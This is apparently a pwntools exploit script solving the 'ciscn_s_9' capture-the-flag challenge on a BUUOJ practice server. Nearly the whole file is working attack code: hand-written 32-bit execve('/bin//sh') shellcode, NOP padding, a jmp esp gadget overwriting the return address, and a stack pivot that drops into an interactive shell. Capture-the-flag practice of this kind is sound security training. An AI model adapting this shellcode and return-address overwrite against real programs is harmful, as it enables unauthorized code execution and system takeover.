#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'ciscn_s_9')

host = args.HOST or 'node5.buuoj.cn'
port = int(args.PORT or 25554)


def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *pwn+148
continue
'''.format(**locals())

jmp_esp = 0x8048554
io = start()

shellcode = '''
xor eax,eax
xor edx,edx
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx,esp
xor ecx,ecx
mov al, 0xb
int 0x80
'''

p = asm(shellcode)
p = p.ljust(36, b'\x90')
p += p32(jmp_esp)
p += asm('sub esp,40;call esp')
io.sendlineafter(b'>\n', p)

io.interactive()

